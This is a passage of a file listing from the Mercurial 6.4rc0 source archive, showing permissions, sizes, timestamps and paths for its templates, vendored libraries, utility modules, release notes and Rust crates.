+-rw-r--r--   0 alphare   (1000) alphare   (1000)      284 2023-03-02 22:29:51.000000 mercurial-6.4rc0/mercurial/templates/static/coal-folder.png
+-rw-r--r--   0 alphare   (1000) alphare   (1000)      689 2023-03-02 22:29:51.000000 mercurial-6.4rc0/mercurial/templates/static/feed-icon-14x14.png
+-rw-r--r--   0 alphare   (1000) alphare   (1000)    10887 2023-03-02 22:29:51.000000 mercurial-6.4rc0/mercurial/templates/static/followlines.js
+-rw-r--r--   0 alphare   (1000) alphare   (1000)      792 2023-03-02 22:29:51.000000 mercurial-6.4rc0/mercurial/templates/static/hgicon.png
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     4123 2023-03-02 22:29:51.000000 mercurial-6.4rc0/mercurial/templates/static/hglogo.png
+-rw-r--r--   0 alphare   (1000) alphare   (1000)    15779 2023-03-02 22:29:51.000000 mercurial-6.4rc0/mercurial/templates/static/mercurial.js
+-rw-r--r--   0 alphare   (1000) alphare   (1000)      608 2023-03-02 22:29:51.000000 mercurial-6.4rc0/mercurial/templates/static/style-extra-coal.css
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     9074 2023-03-02 22:29:51.000000 mercurial-6.4rc0/mercurial/templates/static/style-gitweb.css
+-rw-r--r--   0 alphare   (1000) alphare   (1000)    10635 2023-03-02 22:29:51.000000 mercurial-6.4rc0/mercurial/templates/static/style-monoblue.css
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     9313 2023-03-02 22:29:51.000000 mercurial-6.4rc0/mercurial/templates/static/style-paper.css
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     2677 2023-03-02 22:29:51.000000 mercurial-6.4rc0/mercurial/templates/static/style.css
+-rw-r--r--   0 alphare   (1000) alphare   (1000)    36367 2023-03-02 22:29:51.000000 mercurial-6.4rc0/mercurial/templateutil.py
+drwxr-xr-x   0 alphare   (1000) alphare   (1000)        0 2023-03-02 22:30:09.226632 mercurial-6.4rc0/mercurial/testing/
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     1499 2023-03-02 22:29:51.000000 mercurial-6.4rc0/mercurial/testing/__init__.py
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     1637 2023-03-02 22:29:51.000000 mercurial-6.4rc0/mercurial/testing/revlog.py
+-rw-r--r--   0 alphare   (1000) alphare   (1000)    47745 2023-03-02 22:29:51.000000 mercurial-6.4rc0/mercurial/testing/storage.py
+drwxr-xr-x   0 alphare   (1000) alphare   (1000)        0 2023-03-02 22:30:09.226632 mercurial-6.4rc0/mercurial/thirdparty/
+-rw-r--r--   0 alphare   (1000) alphare   (1000)        0 2023-03-02 22:29:51.000000 mercurial-6.4rc0/mercurial/thirdparty/__init__.py
+drwxr-xr-x   0 alphare   (1000) alphare   (1000)        0 2023-03-02 22:30:09.230632 mercurial-6.4rc0/mercurial/thirdparty/attr/
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     1109 2023-03-02 22:29:51.000000 mercurial-6.4rc0/mercurial/thirdparty/attr/LICENSE
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     1602 2023-03-02 22:29:51.000000 mercurial-6.4rc0/mercurial/thirdparty/attr/__init__.py
+-rw-r--r--   0 alphare   (1000) alphare   (1000)    15137 2023-03-02 22:29:51.000000 mercurial-6.4rc0/mercurial/thirdparty/attr/__init__.pyi
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     4102 2023-03-02 22:29:51.000000 mercurial-6.4rc0/mercurial/thirdparty/attr/_cmp.py
+-rw-r--r--   0 alphare   (1000) alphare   (1000)      357 2023-03-02 22:29:51.000000 mercurial-6.4rc0/mercurial/thirdparty/attr/_cmp.pyi
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     5568 2023-03-02 22:29:51.000000 mercurial-6.4rc0/mercurial/thirdparty/attr/_compat.py
+-rw-r--r--   0 alphare   (1000) alphare   (1000)      826 2023-03-02 22:29:51.000000 mercurial-6.4rc0/mercurial/thirdparty/attr/_config.py
+-rw-r--r--   0 alphare   (1000) alphare   (1000)    14645 2023-03-02 22:29:51.000000 mercurial-6.4rc0/mercurial/thirdparty/attr/_funcs.py
+-rw-r--r--   0 alphare   (1000) alphare   (1000)    97569 2023-03-02 22:29:51.000000 mercurial-6.4rc0/mercurial/thirdparty/attr/_make.py
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     5882 2023-03-02 22:29:51.000000 mercurial-6.4rc0/mercurial/thirdparty/attr/_next_gen.py
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     2121 2023-03-02 22:29:51.000000 mercurial-6.4rc0/mercurial/thirdparty/attr/_version_info.py
+-rw-r--r--   0 alphare   (1000) alphare   (1000)      209 2023-03-02 22:29:51.000000 mercurial-6.4rc0/mercurial/thirdparty/attr/_version_info.pyi
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     3610 2023-03-02 22:29:51.000000 mercurial-6.4rc0/mercurial/thirdparty/attr/converters.py
+-rw-r--r--   0 alphare   (1000) alphare   (1000)      416 2023-03-02 22:29:51.000000 mercurial-6.4rc0/mercurial/thirdparty/attr/converters.pyi
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     1915 2023-03-02 22:29:51.000000 mercurial-6.4rc0/mercurial/thirdparty/attr/exceptions.py
+-rw-r--r--   0 alphare   (1000) alphare   (1000)      539 2023-03-02 22:29:51.000000 mercurial-6.4rc0/mercurial/thirdparty/attr/exceptions.pyi
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     1038 2023-03-02 22:29:51.000000 mercurial-6.4rc0/mercurial/thirdparty/attr/filters.py
+-rw-r--r--   0 alphare   (1000) alphare   (1000)      215 2023-03-02 22:29:51.000000 mercurial-6.4rc0/mercurial/thirdparty/attr/filters.pyi
+-rw-r--r--   0 alphare   (1000) alphare   (1000)        0 2023-03-02 22:29:51.000000 mercurial-6.4rc0/mercurial/thirdparty/attr/py.typed
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     1400 2023-03-02 22:29:51.000000 mercurial-6.4rc0/mercurial/thirdparty/attr/setters.py
+-rw-r--r--   0 alphare   (1000) alphare   (1000)      573 2023-03-02 22:29:51.000000 mercurial-6.4rc0/mercurial/thirdparty/attr/setters.pyi
+-rw-r--r--   0 alphare   (1000) alphare   (1000)    16793 2023-03-02 22:29:51.000000 mercurial-6.4rc0/mercurial/thirdparty/attr/validators.py
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     2355 2023-03-02 22:29:51.000000 mercurial-6.4rc0/mercurial/thirdparty/attr/validators.pyi
+drwxr-xr-x   0 alphare   (1000) alphare   (1000)        0 2023-03-02 22:30:09.230632 mercurial-6.4rc0/mercurial/thirdparty/cbor/
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     1764 2023-03-02 22:29:51.000000 mercurial-6.4rc0/mercurial/thirdparty/cbor/.travis.yml
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     1130 2023-03-02 22:29:51.000000 mercurial-6.4rc0/mercurial/thirdparty/cbor/LICENSE.txt
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     1089 2023-03-02 22:29:51.000000 mercurial-6.4rc0/mercurial/thirdparty/cbor/README.rst
+-rw-r--r--   0 alphare   (1000) alphare   (1000)      141 2023-03-02 22:29:51.000000 mercurial-6.4rc0/mercurial/thirdparty/cbor/__init__.py
+drwxr-xr-x   0 alphare   (1000) alphare   (1000)        0 2023-03-02 22:30:09.230632 mercurial-6.4rc0/mercurial/thirdparty/cbor/cbor2/
+-rw-r--r--   0 alphare   (1000) alphare   (1000)      224 2023-03-02 22:29:51.000000 mercurial-6.4rc0/mercurial/thirdparty/cbor/cbor2/__init__.py
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     2603 2023-03-02 22:29:51.000000 mercurial-6.4rc0/mercurial/thirdparty/cbor/cbor2/compat.py
+-rw-r--r--   0 alphare   (1000) alphare   (1000)    11722 2023-03-02 22:29:51.000000 mercurial-6.4rc0/mercurial/thirdparty/cbor/cbor2/decoder.py
+-rw-r--r--   0 alphare   (1000) alphare   (1000)    13687 2023-03-02 22:29:51.000000 mercurial-6.4rc0/mercurial/thirdparty/cbor/cbor2/encoder.py
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     1302 2023-03-02 22:29:51.000000 mercurial-6.4rc0/mercurial/thirdparty/cbor/cbor2/types.py
+drwxr-xr-x   0 alphare   (1000) alphare   (1000)        0 2023-03-02 22:30:09.230632 mercurial-6.4rc0/mercurial/thirdparty/sha1dc/
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     1270 2023-03-02 22:29:51.000000 mercurial-6.4rc0/mercurial/thirdparty/sha1dc/LICENSE.txt
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     5786 2023-03-02 22:29:51.000000 mercurial-6.4rc0/mercurial/thirdparty/sha1dc/README.md
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     6801 2023-03-02 22:29:51.000000 mercurial-6.4rc0/mercurial/thirdparty/sha1dc/cext.c
+drwxr-xr-x   0 alphare   (1000) alphare   (1000)        0 2023-03-02 22:30:09.230632 mercurial-6.4rc0/mercurial/thirdparty/sha1dc/lib/
+-rw-r--r--   0 alphare   (1000) alphare   (1000)    57725 2023-03-02 22:29:51.000000 mercurial-6.4rc0/mercurial/thirdparty/sha1dc/lib/sha1.c
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     4368 2023-03-02 22:29:51.000000 mercurial-6.4rc0/mercurial/thirdparty/sha1dc/lib/sha1.h
+-rw-r--r--   0 alphare   (1000) alphare   (1000)    47913 2023-03-02 22:29:51.000000 mercurial-6.4rc0/mercurial/thirdparty/sha1dc/lib/ubc_check.c
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     1844 2023-03-02 22:29:51.000000 mercurial-6.4rc0/mercurial/thirdparty/sha1dc/lib/ubc_check.h
+drwxr-xr-x   0 alphare   (1000) alphare   (1000)        0 2023-03-02 22:30:09.230632 mercurial-6.4rc0/mercurial/thirdparty/xdiff/
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     2316 2023-03-02 22:29:51.000000 mercurial-6.4rc0/mercurial/thirdparty/xdiff/xdiff.h
+-rw-r--r--   0 alphare   (1000) alphare   (1000)    29866 2023-03-02 22:29:51.000000 mercurial-6.4rc0/mercurial/thirdparty/xdiff/xdiffi.c
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     1683 2023-03-02 22:29:51.000000 mercurial-6.4rc0/mercurial/thirdparty/xdiff/xdiffi.h
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     1150 2023-03-02 22:29:51.000000 mercurial-6.4rc0/mercurial/thirdparty/xdiff/xinclude.h
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     1901 2023-03-02 22:29:51.000000 mercurial-6.4rc0/mercurial/thirdparty/xdiff/xmacros.h
+-rw-r--r--   0 alphare   (1000) alphare   (1000)    13850 2023-03-02 22:29:51.000000 mercurial-6.4rc0/mercurial/thirdparty/xdiff/xprepare.c
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     1058 2023-03-02 22:29:51.000000 mercurial-6.4rc0/mercurial/thirdparty/xdiff/xprepare.h
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     2730 2023-03-02 22:29:51.000000 mercurial-6.4rc0/mercurial/thirdparty/xdiff/xtypes.h
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     3168 2023-03-02 22:29:51.000000 mercurial-6.4rc0/mercurial/thirdparty/xdiff/xutils.c
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     1331 2023-03-02 22:29:51.000000 mercurial-6.4rc0/mercurial/thirdparty/xdiff/xutils.h
+drwxr-xr-x   0 alphare   (1000) alphare   (1000)        0 2023-03-02 22:30:09.230632 mercurial-6.4rc0/mercurial/thirdparty/zope/
+-rw-r--r--   0 alphare   (1000) alphare   (1000)        0 2023-03-02 22:29:51.000000 mercurial-6.4rc0/mercurial/thirdparty/zope/__init__.py
+drwxr-xr-x   0 alphare   (1000) alphare   (1000)        0 2023-03-02 22:30:09.230632 mercurial-6.4rc0/mercurial/thirdparty/zope/interface/
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     2070 2023-03-02 22:29:51.000000 mercurial-6.4rc0/mercurial/thirdparty/zope/interface/LICENSE.txt
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     3101 2023-03-02 22:29:51.000000 mercurial-6.4rc0/mercurial/thirdparty/zope/interface/__init__.py
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     1726 2023-03-02 22:29:51.000000 mercurial-6.4rc0/mercurial/thirdparty/zope/interface/_compat.py
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     1093 2023-03-02 22:29:51.000000 mercurial-6.4rc0/mercurial/thirdparty/zope/interface/_flatten.py
+-rw-r--r--   0 alphare   (1000) alphare   (1000)    45982 2023-03-02 22:29:51.000000 mercurial-6.4rc0/mercurial/thirdparty/zope/interface/_zope_interface_coptimizations.c
+-rw-r--r--   0 alphare   (1000) alphare   (1000)    23342 2023-03-02 22:29:51.000000 mercurial-6.4rc0/mercurial/thirdparty/zope/interface/adapter.py
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     7526 2023-03-02 22:29:51.000000 mercurial-6.4rc0/mercurial/thirdparty/zope/interface/advice.py
+drwxr-xr-x   0 alphare   (1000) alphare   (1000)        0 2023-03-02 22:30:09.230632 mercurial-6.4rc0/mercurial/thirdparty/zope/interface/common/
+-rw-r--r--   0 alphare   (1000) alphare   (1000)       61 2023-03-02 22:29:51.000000 mercurial-6.4rc0/mercurial/thirdparty/zope/interface/common/__init__.py
+-rw-r--r--   0 alphare   (1000) alphare   (1000)    20067 2023-03-02 22:29:51.000000 mercurial-6.4rc0/mercurial/thirdparty/zope/interface/common/idatetime.py
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     4272 2023-03-02 22:29:51.000000 mercurial-6.4rc0/mercurial/thirdparty/zope/interface/common/interfaces.py
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     3445 2023-03-02 22:29:51.000000 mercurial-6.4rc0/mercurial/thirdparty/zope/interface/common/mapping.py
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     4698 2023-03-02 22:29:51.000000 mercurial-6.4rc0/mercurial/thirdparty/zope/interface/common/sequence.py
+-rw-r--r--   0 alphare   (1000) alphare   (1000)    30880 2023-03-02 22:29:51.000000 mercurial-6.4rc0/mercurial/thirdparty/zope/interface/declarations.py
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     4015 2023-03-02 22:29:51.000000 mercurial-6.4rc0/mercurial/thirdparty/zope/interface/document.py
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     2039 2023-03-02 22:29:51.000000 mercurial-6.4rc0/mercurial/thirdparty/zope/interface/exceptions.py
+-rw-r--r--   0 alphare   (1000) alphare   (1000)    20297 2023-03-02 22:29:51.000000 mercurial-6.4rc0/mercurial/thirdparty/zope/interface/interface.py
+-rw-r--r--   0 alphare   (1000) alphare   (1000)    43188 2023-03-02 22:29:51.000000 mercurial-6.4rc0/mercurial/thirdparty/zope/interface/interfaces.py
+-rw-r--r--   0 alphare   (1000) alphare   (1000)    23084 2023-03-02 22:29:51.000000 mercurial-6.4rc0/mercurial/thirdparty/zope/interface/registry.py
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     2045 2023-03-02 22:29:51.000000 mercurial-6.4rc0/mercurial/thirdparty/zope/interface/ro.py
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     4688 2023-03-02 22:29:51.000000 mercurial-6.4rc0/mercurial/thirdparty/zope/interface/verify.py
+-rw-r--r--   0 alphare   (1000) alphare   (1000)    27521 2023-03-02 22:29:51.000000 mercurial-6.4rc0/mercurial/transaction.py
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     7106 2023-03-02 22:29:51.000000 mercurial-6.4rc0/mercurial/treediscovery.py
+-rw-r--r--   0 alphare   (1000) alphare   (1000)      943 2023-03-02 22:29:51.000000 mercurial-6.4rc0/mercurial/txnutil.py
+-rw-r--r--   0 alphare   (1000) alphare   (1000)      955 2023-03-02 22:29:51.000000 mercurial-6.4rc0/mercurial/typelib.py
+-rw-r--r--   0 alphare   (1000) alphare   (1000)    84492 2023-03-02 22:29:51.000000 mercurial-6.4rc0/mercurial/ui.py
+-rw-r--r--   0 alphare   (1000) alphare   (1000)    10136 2023-03-02 22:29:51.000000 mercurial-6.4rc0/mercurial/unionrepo.py
+-rw-r--r--   0 alphare   (1000) alphare   (1000)    15110 2023-03-02 22:29:51.000000 mercurial-6.4rc0/mercurial/upgrade.py
+drwxr-xr-x   0 alphare   (1000) alphare   (1000)        0 2023-03-02 22:30:09.230632 mercurial-6.4rc0/mercurial/upgrade_utils/
+-rw-r--r--   0 alphare   (1000) alphare   (1000)        0 2023-03-02 22:29:51.000000 mercurial-6.4rc0/mercurial/upgrade_utils/__init__.py
+-rw-r--r--   0 alphare   (1000) alphare   (1000)    35686 2023-03-02 22:29:51.000000 mercurial-6.4rc0/mercurial/upgrade_utils/actions.py
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     8754 2023-03-02 22:29:51.000000 mercurial-6.4rc0/mercurial/upgrade_utils/auto_upgrade.py
+-rw-r--r--   0 alphare   (1000) alphare   (1000)    22379 2023-03-02 22:29:51.000000 mercurial-6.4rc0/mercurial/upgrade_utils/engine.py
+-rw-r--r--   0 alphare   (1000) alphare   (1000)    22867 2023-03-02 22:29:51.000000 mercurial-6.4rc0/mercurial/url.py
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     3567 2023-03-02 22:29:51.000000 mercurial-6.4rc0/mercurial/urllibcompat.py
+-rw-r--r--   0 alphare   (1000) alphare   (1000)    95350 2023-03-02 22:29:51.000000 mercurial-6.4rc0/mercurial/util.py
+drwxr-xr-x   0 alphare   (1000) alphare   (1000)        0 2023-03-02 22:30:09.230632 mercurial-6.4rc0/mercurial/utils/
+-rw-r--r--   0 alphare   (1000) alphare   (1000)        0 2023-03-02 22:29:51.000000 mercurial-6.4rc0/mercurial/utils/__init__.py
+-rw-r--r--   0 alphare   (1000) alphare   (1000)    37211 2023-03-02 22:29:51.000000 mercurial-6.4rc0/mercurial/utils/cborutil.py
+-rw-r--r--   0 alphare   (1000) alphare   (1000)    25623 2023-03-02 22:29:51.000000 mercurial-6.4rc0/mercurial/utils/compression.py
+-rw-r--r--   0 alphare   (1000) alphare   (1000)    11775 2023-03-02 22:29:51.000000 mercurial-6.4rc0/mercurial/utils/dateutil.py
+-rw-r--r--   0 alphare   (1000) alphare   (1000)      175 2023-03-02 22:29:51.000000 mercurial-6.4rc0/mercurial/utils/hashutil.py
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     1410 2023-03-02 22:29:51.000000 mercurial-6.4rc0/mercurial/utils/memorytop.py
+-rw-r--r--   0 alphare   (1000) alphare   (1000)    23010 2023-03-02 22:29:51.000000 mercurial-6.4rc0/mercurial/utils/procutil.py
+-rw-r--r--   0 alphare   (1000) alphare   (1000)      757 2023-03-02 22:29:51.000000 mercurial-6.4rc0/mercurial/utils/repoviewutil.py
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     3868 2023-03-02 22:29:51.000000 mercurial-6.4rc0/mercurial/utils/resourceutil.py
+-rw-r--r--   0 alphare   (1000) alphare   (1000)    21551 2023-03-02 22:29:51.000000 mercurial-6.4rc0/mercurial/utils/storageutil.py
+-rw-r--r--   0 alphare   (1000) alphare   (1000)    30373 2023-03-02 22:29:51.000000 mercurial-6.4rc0/mercurial/utils/stringutil.py
+-rw-r--r--   0 alphare   (1000) alphare   (1000)    30569 2023-03-02 22:29:51.000000 mercurial-6.4rc0/mercurial/utils/urlutil.py
+-rw-r--r--   0 alphare   (1000) alphare   (1000)    23428 2023-03-02 22:29:51.000000 mercurial-6.4rc0/mercurial/verify.py
+-rw-r--r--   0 alphare   (1000) alphare   (1000)    27529 2023-03-02 22:29:51.000000 mercurial-6.4rc0/mercurial/vfs.py
+-rw-r--r--   0 alphare   (1000) alphare   (1000)    22889 2023-03-02 22:29:51.000000 mercurial-6.4rc0/mercurial/win32.py
+-rw-r--r--   0 alphare   (1000) alphare   (1000)    23634 2023-03-02 22:29:51.000000 mercurial-6.4rc0/mercurial/windows.py
+-rw-r--r--   0 alphare   (1000) alphare   (1000)    66136 2023-03-02 22:29:51.000000 mercurial-6.4rc0/mercurial/wireprotoframing.py
+-rw-r--r--   0 alphare   (1000) alphare   (1000)    17715 2023-03-02 22:29:51.000000 mercurial-6.4rc0/mercurial/wireprotoserver.py
+-rw-r--r--   0 alphare   (1000) alphare   (1000)    13261 2023-03-02 22:29:51.000000 mercurial-6.4rc0/mercurial/wireprototypes.py
+-rw-r--r--   0 alphare   (1000) alphare   (1000)    21923 2023-03-02 22:29:51.000000 mercurial-6.4rc0/mercurial/wireprotov1peer.py
+-rw-r--r--   0 alphare   (1000) alphare   (1000)    26898 2023-03-02 22:29:51.000000 mercurial-6.4rc0/mercurial/wireprotov1server.py
+-rw-r--r--   0 alphare   (1000) alphare   (1000)    15337 2023-03-02 22:29:51.000000 mercurial-6.4rc0/mercurial/worker.py
+drwxr-xr-x   0 alphare   (1000) alphare   (1000)        0 2023-03-02 22:30:09.218632 mercurial-6.4rc0/mercurial.egg-info/
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     1323 2023-03-02 22:30:09.000000 mercurial-6.4rc0/mercurial.egg-info/PKG-INFO
+-rw-r--r--   0 alphare   (1000) alphare   (1000)    68610 2023-03-02 22:30:09.000000 mercurial-6.4rc0/mercurial.egg-info/SOURCES.txt
+-rw-r--r--   0 alphare   (1000) alphare   (1000)        1 2023-03-02 22:30:09.000000 mercurial-6.4rc0/mercurial.egg-info/dependency_links.txt
+-rw-r--r--   0 alphare   (1000) alphare   (1000)       40 2023-03-02 22:30:09.000000 mercurial-6.4rc0/mercurial.egg-info/top_level.txt
+-rw-r--r--   0 alphare   (1000) alphare   (1000)      244 2023-03-02 22:29:51.000000 mercurial-6.4rc0/pyproject.toml
+drwxr-xr-x   0 alphare   (1000) alphare   (1000)        0 2023-03-02 22:30:09.230632 mercurial-6.4rc0/relnotes/
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     3757 2023-03-02 22:29:51.000000 mercurial-6.4rc0/relnotes/5.1
+-rw-r--r--   0 alphare   (1000) alphare   (1000)      897 2023-03-02 22:29:51.000000 mercurial-6.4rc0/relnotes/5.2
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     1233 2023-03-02 22:29:51.000000 mercurial-6.4rc0/relnotes/5.3
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     3507 2023-03-02 22:29:51.000000 mercurial-6.4rc0/relnotes/5.4
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     3504 2023-03-02 22:29:51.000000 mercurial-6.4rc0/relnotes/5.5
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     1391 2023-03-02 22:29:51.000000 mercurial-6.4rc0/relnotes/5.6
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     3078 2023-03-02 22:29:51.000000 mercurial-6.4rc0/relnotes/5.7
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     2742 2023-03-02 22:29:51.000000 mercurial-6.4rc0/relnotes/5.8
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     3417 2023-03-02 22:29:51.000000 mercurial-6.4rc0/relnotes/5.9
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     5198 2023-03-02 22:29:51.000000 mercurial-6.4rc0/relnotes/6.0
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     8465 2023-03-02 22:29:51.000000 mercurial-6.4rc0/relnotes/6.1
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     4671 2023-03-02 22:29:51.000000 mercurial-6.4rc0/relnotes/6.2
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     9264 2023-03-02 22:29:51.000000 mercurial-6.4rc0/relnotes/6.3
+-rw-r--r--   0 alphare   (1000) alphare   (1000)      630 2023-03-02 22:29:51.000000 mercurial-6.4rc0/relnotes/next
+drwxr-xr-x   0 alphare   (1000) alphare   (1000)        0 2023-03-02 22:30:09.230632 mercurial-6.4rc0/rust/
+drwxr-xr-x   0 alphare   (1000) alphare   (1000)        0 2023-03-02 22:30:09.230632 mercurial-6.4rc0/rust/.cargo/
+-rw-r--r--   0 alphare   (1000) alphare   (1000)      399 2023-03-02 22:29:51.000000 mercurial-6.4rc0/rust/.cargo/config
+-rw-r--r--   0 alphare   (1000) alphare   (1000)    36259 2023-03-02 22:29:51.000000 mercurial-6.4rc0/rust/Cargo.lock
+-rw-r--r--   0 alphare   (1000) alphare   (1000)       82 2023-03-02 22:29:51.000000 mercurial-6.4rc0/rust/Cargo.toml
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     4157 2023-03-02 22:29:51.000000 mercurial-6.4rc0/rust/README.rst
+drwxr-xr-x   0 alphare   (1000) alphare   (1000)        0 2023-03-02 22:30:09.230632 mercurial-6.4rc0/rust/chg/
+-rw-r--r--   0 alphare   (1000) alphare   (1000)    23054 2023-03-02 22:29:51.000000 mercurial-6.4rc0/rust/chg/Cargo.lock
+-rw-r--r--   0 alphare   (1000) alphare   (1000)      474 2023-03-02 22:29:51.000000 mercurial-6.4rc0/rust/chg/Cargo.toml
+-rw-r--r--   0 alphare   (1000) alphare   (1000)      155 2023-03-02 22:29:51.000000 mercurial-6.4rc0/rust/chg/build.rs
+drwxr-xr-x   0 alphare   (1000) alphare   (1000)        0 2023-03-02 22:30:09.234632 mercurial-6.4rc0/rust/chg/src/
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     2503 2023-03-02 22:29:51.000000 mercurial-6.4rc0/rust/chg/src/attachio.rs
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     4071 2023-03-02 22:29:51.000000 mercurial-6.4rc0/rust/chg/src/clientext.rs
+-rw-r--r--   0 alphare   (1000) alphare   (1000)      383 2023-03-02 22:29:51.000000 mercurial-6.4rc0/rust/chg/src/lib.rs
+-rw-r--r--   0 alphare   (1000) alphare   (1000)    15481 2023-03-02 22:29:51.000000 mercurial-6.4rc0/rust/chg/src/locator.rs
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     2505 2023-03-02 22:29:51.000000 mercurial-6.4rc0/rust/chg/src/main.rs
+-rw-r--r--   0 alphare   (1000) alphare   (1000)    10104 2023-03-02 22:29:51.000000 mercurial-6.4rc0/rust/chg/src/message.rs
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     2901 2023-03-02 22:29:51.000000 mercurial-6.4rc0/rust/chg/src/procutil.rs
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     2487 2023-03-02 22:29:51.000000 mercurial-6.4rc0/rust/chg/src/runcommand.rs
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     1335 2023-03-02 22:29:51.000000 mercurial-6.4rc0/rust/chg/src/sendfds.c
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     3815 2023-03-02 22:29:51.000000 mercurial-6.4rc0/rust/chg/src/sighandlers.c
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     2735 2023-03-02 22:29:51.000000 mercurial-6.4rc0/rust/chg/src/uihandler.rs
+drwxr-xr-x   0 alphare   (1000) alphare   (1000)        0 2023-03-02 22:30:09.234632 mercurial-6.4rc0/rust/hg-core/
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     1316 2023-03-02 22:29:51.000000 mercurial-6.4rc0/rust/hg-core/Cargo.toml
+drwxr-xr-x   0 alphare   (1000) alphare   (1000)        0 2023-03-02 22:30:09.186632 mercurial-6.4rc0/rust/hg-core/examples/
+drwxr-xr-x   0 alphare   (1000) alphare   (1000)        0 2023-03-02 22:30:09.234632 mercurial-6.4rc0/rust/hg-core/examples/nodemap/
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     2437 2023-03-02 22:29:51.000000 mercurial-6.4rc0/rust/hg-core/examples/nodemap/index.rs
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     4339 2023-03-02 22:29:51.000000 mercurial-6.4rc0/rust/hg-core/examples/nodemap/main.rs
+drwxr-xr-x   0 alphare   (1000) alphare   (1000)        0 2023-03-02 22:30:09.234632 mercurial-6.4rc0/rust/hg-core/src/
+-rw-r--r--   0 alphare   (1000) alphare   (1000)    23431 2023-03-02 22:29:51.000000 mercurial-6.4rc0/rust/hg-core/src/ancestors.rs
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     4077 2023-03-02 22:29:51.000000 mercurial-6.4rc0/rust/hg-core/src/checkexec.rs
+drwxr-xr-x   0 alphare   (1000) alphare   (1000)        0 2023-03-02 22:30:09.234632 mercurial-6.4rc0/rust/hg-core/src/config/
+-rw-r--r--   0 alphare   (1000) alphare   (1000)        1 2023-03-02 22:29:51.000000 mercurial-6.4rc0/rust/hg-core/src/config/config.rs
+-rw-r--r--   0 alphare   (1000) alphare   (1000)    12029 2023-03-02 22:29:51.000000 mercurial-6.4rc0/rust/hg-core/src/config/layer.rs
+-rw-r--r--   0 alphare   (1000) alphare   (1000)    21307 2023-03-02 22:29:51.000000 mercurial-6.4rc0/rust/hg-core/src/config/mod.rs
+-rw-r--r--   0 alphare   (1000) alphare   (1000)     2235 2023-03-02 22:29:51.000000 mercurial-6.4rc0/rust/hg-core/src/config/plain_info.rs
+-rw-r--r--   0 alphare   (1000) alphare   (1000)    10001 2023-03-02 22:29:51.000000 mercurial-6.4rc0/rust/hg-core/src/config/values.rs
+drwxr-xr-x   0 alphare   (1000) alphare   (1000)        0 2023-03-02 22:30:09.234632 mercurial-6.4rc0/rust/hg-core/src/copy_tracing/
